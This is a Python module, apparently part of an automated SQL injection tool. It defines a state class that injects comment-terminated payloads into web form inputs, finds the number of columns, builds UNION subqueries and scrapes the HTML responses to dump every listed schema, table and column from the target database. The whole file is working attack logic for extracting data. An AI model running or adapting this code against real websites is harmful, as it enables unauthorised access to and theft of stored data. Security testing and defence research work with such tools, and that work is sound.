import logging

from src.engines.sql_injection_engine import SQLInjectionEngine
from src.injector_state.sql_injector_state import SQLInjectorState
from src.injector_state.sql_injector_end_state import SQLInjectorEndState
from src.sql_injection_builder import SQLInjectionBuilder
from src.scraping.parse_sql_response_from_html import parse_sql_response_from_html

class SQLInjectorDumpState(SQLInjectorState):
    def __init__(self, sql_injector, engine, schemas) -> None:
        super().__init__(sql_injector)
        self.engine = engine
        self.schemas_to_do =  [(schema, table, column) for schema in schemas for table in schemas[schema] for column in schemas[schema][table]]

    def next(self):
        self.sql_injector.state = SQLInjectorEndState(self.sql_injector)
        return self.sql_injector.state

    def inject(self, action, input_chosen, inputs):
        for key in SQLInjectorState.injections_to_try:
            response = super().injection(action, input_chosen, inputs, key + "; -- ")
            if response is not None:
                while True:
                    database_dump = self.get_database_names(action, input_chosen, inputs, key, self.schemas_to_do[0])
                    if database_dump is not None:
                        logging.info(f"\033[0;36mDatabase Dump: {self.schemas_to_do[0][0]}.{self.schemas_to_do[0][1]}.{self.schemas_to_do[0][2]} are {database_dump}\033[0m")
                        self.next()
                        self.schemas_to_do.pop(0)
                        if len(self.schemas_to_do) == 0:
                            self.next()
                            return True
                    else:
                        break
        return False

    def get_database_names(self, action, input_chosen, inputs, previous_str, schema_and_table):
        number_of_columns = super().get_number_of_columns(action, input_chosen, inputs, previous_str)
        if number_of_columns is None:
            return None
        else:
            sql_injection_string = SQLInjectionBuilder().add_str(previous_str).union_subquery(self.engine.query(number_of_columns, schema_and_table[0], schema_and_table[1],  schema_and_table[2])).build()
            response = super().injection(action, input_chosen, inputs, sql_injection_string)
            if response is not None:
                return [schema[1] for schema in parse_sql_response_from_html(response.text, [schema_and_table[2]], SQLInjectionEngine.injection_prefix, SQLInjectionEngine.injection_suffix)]
            else:
                return None
        
